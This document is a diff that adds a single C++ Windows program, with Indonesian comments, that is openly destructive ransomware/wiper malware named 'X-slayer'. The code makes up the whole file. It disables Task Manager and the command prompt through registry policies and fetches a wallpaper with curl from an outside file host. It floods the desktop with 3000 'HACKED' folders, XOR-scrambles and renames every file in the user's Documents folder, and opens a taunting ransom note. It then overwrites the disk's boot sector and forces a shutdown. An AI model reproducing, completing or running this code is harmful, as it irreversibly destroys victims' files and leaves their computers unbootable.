@@ -1,0 +1,94 @@
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <vector>
+#include <filesystem>
+#include <thread>
+#include <chrono>
+
+namespace fs = std::filesystem;
+
+// 1. Fungsi Create 3000 Folder
+void SpamFolders() {
+    for (int i = 1; i <= 3000; ++i) {
+        std::string folderName = "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Desktop\\HACKED BY IRFAN_" + std::to_string(i);
+        CreateDirectoryA(folderName.c_str(), NULL);
+    }
+}
+
+// 2. Disable CMD & Task Manager via Registry
+void DisableSystemTools() {
+    HKEY hKey;
+    // Disable Task Manager
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = 1;
+        RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+    // Disable CMD
+    if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD val = 2;
+        RegSetValueExA(hKey, "DisableCMD", 0, REG_DWORD, (const BYTE*)&val, sizeof(val));
+        RegCloseKey(hKey);
+    }
+}
+
+// 3. Ubah Wallpaper
+void SetWallpaper() {
+    const char* url = "https://litter.catbox.moe/z5gekae6zce4t0tp.jpg";
+    const char* path = "C:\\temp_wp.jpg";
+    // Download image (Requires URLDownloadToFile)
+    system("curl -o C:\\temp_wp.jpg https://litter.catbox.moe/z5gekae6zce4t0tp.jpg");
+    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
+}
+
+// 4. Double Encryption (XOR + Simple Caesar-Shift logic)
+void XEncrypt(std::string filePath) {
+    std::fstream file(filePath, std::ios::in | std::ios::out | std::ios::binary);
+    if (file.is_open()) {
+        std::string data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+        for (size_t i = 0; i < data.size(); ++i) {
+            data[i] = (data[i] ^ 0xFF) + 5; // Double layers
+        }
+        file.seekp(0);
+        file.write(data.c_str(), data.size());
+        file.close();
+        std::rename(filePath.c_str(), (filePath + ".XSLAYER").c_str());
+    }
+}
+
+// 5. Destruction & Notepad
+void FinalBlow() {
+    std::this_thread::sleep_for(std::chrono::minutes(1));
+    std::ofstream note("X_MESSAGE.txt");
+    note << "HAI Xmodder HAHA PC LU UDH KENA RANSOMWARE X-slayer";
+    note.close();
+    system("start notepad X_MESSAGE.txt");
+    
+    std::this_thread::sleep_for(std::chrono::seconds(5));
+    // Overwrite MBR (Master Boot Record) - Melumpuhkan Motherboard/Booting
+    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDrive != INVALID_HANDLE_VALUE) {
+        char trash[512] = {0}; // Menghapus sektor pertama (MBR)
+        DWORD written;
+        WriteFile(hDrive, trash, 512, &written, NULL);
+        CloseHandle(hDrive);
+    }
+    system("shutdown /s /t 0"); // Paksa mati
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    DisableSystemTools();
+    SetWallpaper();
+    SpamFolders();
+    
+    // Encrypt Desktop files as priority
+    std::string path = "C:\\Users\\" + std::string(getenv("USERNAME")) + "\\Documents";
+    for (const auto& entry : fs::recursive_directory_iterator(path)) {
+        if (!entry.is_directory()) XEncrypt(entry.path().string());
+    }
+    
+    FinalBlow();
+    return 0;
+}
